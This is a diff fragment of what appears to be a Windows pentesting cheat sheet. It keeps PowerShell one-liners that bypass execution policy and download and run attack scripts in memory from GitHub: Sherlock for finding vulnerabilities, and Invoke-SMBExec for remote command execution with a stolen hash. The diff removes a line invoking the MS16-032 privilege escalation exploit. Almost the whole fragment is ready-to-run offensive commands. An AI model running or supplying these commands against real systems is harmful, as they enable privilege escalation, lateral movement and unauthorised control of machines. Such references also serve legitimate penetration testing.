@@ -33,12 +33,6 @@ powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString(�
 powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1’); Find-AllVulns"
 ```
 
-To exploit one of those vulnerabilities via Sherlock, for example MS16-032 :
-
-```powershell
-powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1’); Invoke-MS16-032"
-```
-
 ## Invoke-SMBExec : Remote command execution by using a hash :
 ```powershell
 powershell.exe -exec Bypass -C "IEX(New-Object Net.Webclient).DownloadString(‘https://github.com/Kevin-Robertson/Invoke-TheHash/raw/master/Invoke-SMBExec.ps1’);"
